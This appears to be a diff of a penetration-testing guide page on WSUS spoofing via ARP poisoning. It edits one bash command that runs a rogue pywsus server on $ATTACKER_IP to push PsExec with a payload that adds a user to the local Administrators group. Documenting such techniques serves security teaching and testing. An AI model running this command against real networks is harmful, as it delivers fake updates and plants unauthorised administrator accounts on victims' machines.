@@ -169,7 +169,7 @@ ARP poisoning for [WSUS spoofing ](wsus-spoofing.md)in a two-subnets layout (att
 The evil WSUS server needs to be started before doing ARP poisoning. The [pywsus ](https://github.com/GoSecure/pywsus)(Python) utility can be used for that matter.
 
 ```bash
-python3 pywsus.py --host $network_facing_ip --port 8530 --executable /path/to/PsExec64.exe --command '/accepteula /s cmd.exe /c "net user testuser /add && net localgroup Administrators testuser /add"'
+python3 pywsus.py --host $ATTACKER_IP --port 8530 --executable /path/to/PsExec64.exe --command '/accepteula /s cmd.exe /c "net user $USER /add && net localgroup Administrators $USER /add"'
 ```
 
 Once the WSUS server is up and running, the ARP poisoning attack can start.
